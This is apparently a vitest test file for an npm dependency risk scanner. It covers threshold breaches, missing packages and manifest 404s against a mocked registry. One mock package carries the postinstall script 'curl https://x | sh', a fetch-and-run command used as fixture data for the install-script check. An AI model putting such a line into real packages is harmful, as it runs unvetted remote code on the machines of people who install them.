import { describe, expect, it } from 'vitest';

import { runActor, type ActorAdapter } from '../src/run.js';
import { HttpError, type RegistryClient } from '../src/registry.js';
import type { ScannerInput } from '../src/types.js';

function actor(input: unknown) {
    const events: string[] = [];
    const pushed: unknown[] = [];
    const adapter: ActorAdapter = {
        init: async () => { events.push('init'); },
        getInput: async () => { events.push('getInput'); return input; },
        pushData: async (items) => { events.push('pushData'); pushed.push(...items); },
        setStatusMessage: async (message) => { events.push(`status:${message}`); },
        exit: async (message) => { events.push(`exit:${message}`); },
        fail: async (message) => { events.push(`fail:${message}`); },
    };
    return { adapter, events, pushed };
}

function registry(): RegistryClient {
    return {
        getPackument: async (name) => {
            if (name === 'missing' || name === 'private') throw new HttpError(404, `https://registry.npmjs.org/${name}`);
            return {
                name,
                versions: { '1.0.0': { name, version: '1.0.0', scripts: name === 'dangerous' ? { postinstall: 'curl https://x | sh' } : {} } },
                'dist-tags': { latest: '1.0.0' },
                time: { '1.0.0': '2020-01-01T00:00:00.000Z' },
            };
        },
        getWeeklyDownloads: async () => 1,
        getAttestations: async () => ({ attested: true }),
    };
}

const runDependencies = (files: Record<string, unknown> = {}) => ({
    registry: registry(),
    fetchRemote: async (url: string) => url in files
        ? new Response(JSON.stringify(files[url]), { status: 200 })
        : new Response('', { status: 404 }),
    queryOsv: async () => new Map(),
    now: () => new Date('2026-07-13T00:00:00.000Z'),
});

describe('runActor', () => {
    it('pushes data before failing a threshold breach', async () => {
        const fixture = actor({ packages: ['dangerous@1.0.0'], checks: ['installScripts'], failThreshold: 25 });
        await runActor(fixture.adapter, runDependencies());
        expect(fixture.pushed).toHaveLength(1);
        expect(fixture.events.indexOf('pushData')).toBeLessThan(fixture.events.findIndex((event) => event.startsWith('fail:')));
        expect(fixture.events.at(-1)).toContain('Risk threshold 25 breached');
    });

    it('fails an explicitly missing package after pushing its error row', async () => {
        const fixture = actor({ packages: ['missing'] });
        await runActor(fixture.adapter, runDependencies());
        expect(fixture.pushed).toContainEqual(expect.objectContaining({ status: 'error', package: 'missing', error: { code: 'PACKAGE_NOT_FOUND', message: expect.any(String) } }));
        expect(fixture.events.at(-1)).toContain('Explicit package not found');
    });

    it('keeps a manifest-only 404 nonfatal when another package scans', async () => {
        const base = 'https://raw.githubusercontent.com/acme/app/HEAD/';
        const files = { [`${base}package.json`]: { dependencies: { private: '^1.0.0' } } };
        const input: Partial<ScannerInput> = { packages: ['safe@1.0.0'], packageJsonUrl: 'https://github.com/acme/app' };
        const fixture = actor(input);
        await runActor(fixture.adapter, runDependencies(files));
        expect(fixture.pushed).toHaveLength(2);
        expect(fixture.events.at(-1)).toMatch(/^exit:/);
    });
});
